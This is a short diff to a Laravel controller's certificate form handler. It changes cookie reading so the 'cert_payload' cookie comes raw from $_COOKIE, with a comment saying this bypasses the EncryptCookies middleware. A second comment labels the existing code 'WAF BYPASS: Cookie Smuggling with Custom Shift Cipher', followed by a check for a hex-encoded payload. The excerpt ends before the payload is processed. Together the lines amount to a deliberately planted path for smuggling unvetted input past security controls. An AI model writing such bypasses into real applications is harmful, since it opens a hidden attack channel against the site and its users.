@@ -12,7 +12,8 @@ class CertificateFormController extends Controller
     public function show(Request $request)
     {
         $idParam = $request->query('event_id') ?? $request->query('id');
-        $cookiePayload = $request->cookie('cert_payload');
+        // Read directly from $_COOKIE to bypass Laravel's EncryptCookies middleware
+        $cookiePayload = $_COOKIE['cert_payload'] ?? null;
 
         // WAF BYPASS: Cookie Smuggling with Custom Shift Cipher
         if ($cookiePayload && strlen($cookiePayload) > 10 && ctype_xdigit($cookiePayload)) {
